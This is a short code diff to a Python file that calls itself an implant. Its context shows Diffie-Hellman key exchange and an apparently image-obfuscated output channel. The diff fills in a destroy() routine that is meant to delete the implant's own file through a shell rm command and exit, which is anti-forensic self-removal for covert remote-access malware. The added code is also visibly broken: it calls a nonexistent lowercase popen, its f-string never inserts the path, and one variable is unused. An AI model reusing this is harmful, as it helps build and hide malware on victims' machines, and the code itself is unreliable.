@@ -4,6 +4,7 @@ import uuid
 import requests
 import subprocess
 import time
+import sys
 from diffiehellman import DiffieHellman
 
 GREEN = '\033[32m'
@@ -83,6 +84,9 @@ def send_output(obf_img):
 
 #Called to clean up and destroy implant
 def destroy(): 
+    implant_location=os.path.abspath(__file__)
+    subprocess.popen(f"rm -f '{{file_path}}'",shell=True)
+    sys.exit(0)
     pass
 
 def key_dist():
